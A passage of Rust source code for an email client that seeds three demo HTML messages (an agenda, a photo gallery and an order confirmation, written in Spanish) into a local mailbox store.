            from: ("Agenda Ejemplo", "avisos@agenda.example"),
            subject: "Tu agenda de la semana (soporta modo oscuro)",
            snippet: "Martes 10:00 revisión de proyecto; jueves 16:30 entrega de la propuesta.",
            age_minutes: 7,
            html: AWARE.into(),
            text: "Tu agenda: martes 10:00 revisión de proyecto; jueves 16:30 entrega.",
        },
        DemoMail {
            from: ("Elena Torres", "elena@club.example"),
            subject: "Fotos del mes: sendero de la sierra (texto negro, imágenes)",
            snippet: "Os dejo las fotos de la excursión del sábado.",
            age_minutes: 8,
            html: GALLERY
                .replace("{{SCENE}}", PNG_SCENE)
                .replace("{{OK}}", PNG_ICON_OK)
                .replace("{{PLUS}}", PNG_ICON_PLUS)
                .replace("{{BAR}}", PNG_ICON_BAR),
            text: "Fotos de la excursión del sábado. Álbum: https://fotos.ejemplo.net/sierra",
        },
        DemoMail {
            from: ("Tienda Ejemplo", "pedidos@tienda.example"),
            subject: "Pedido #A-10293 confirmado (transaccional con botones)",
            snippet: "Hemos recibido tu pedido. Total 106,40 €.",
            age_minutes: 9,
            html: ORDER.into(),
            text: "Pedido #A-10293 confirmado. Total: 106,40 EUR.",
        },
    ]
}

/// Inserta los correos HTML de demo en `mailbox` (UIDs 101 en adelante, ya leídos).
pub fn seed(store: &Store, mailbox: MailboxId, to_email: &str, now: i64) {
    let mails = mails();
    let headers: Vec<MessageHeader> = mails
        .iter()
        .enumerate()
        .map(|(i, m)| MessageHeader {
            id: 0,
            mailbox_id: mailbox,
            uid: 101 + i as u32,
            message_id: Some(format!("<demo-html-{i}@ejemplo.com>")),
            in_reply_to: None,
            references: Vec::new(),
            subject: m.subject.into(),
            from: vec![Address {
                name: Some(m.from.0.into()),
                email: m.from.1.into(),
            }],
            to: vec![Address {
                name: None,
                email: to_email.into(),
            }],
            cc: Vec::new(),
            date: now - m.age_minutes * 60,
            flags: Flags {
                seen: true,
                ..Flags::default()
            },
            has_attachments: false,
            snippet: Some(m.snippet.into()),
            labels: Vec::new(),
        })
        .collect();
    store
        .upsert_headers(mailbox, &headers)
        .expect("cabeceras demo HTML");
    for (i, m) in mails.iter().enumerate() {
        if let Ok(Some(id)) = store.message_id(mailbox, 101 + i as u32) {
            let _ = store.save_body(
                id,
                &MessageBody {
                    text: Some(m.text.into()),
                    html: Some(m.html.clone()),
                    attachments: Vec::new(),
                },
            );
        }
    }
}
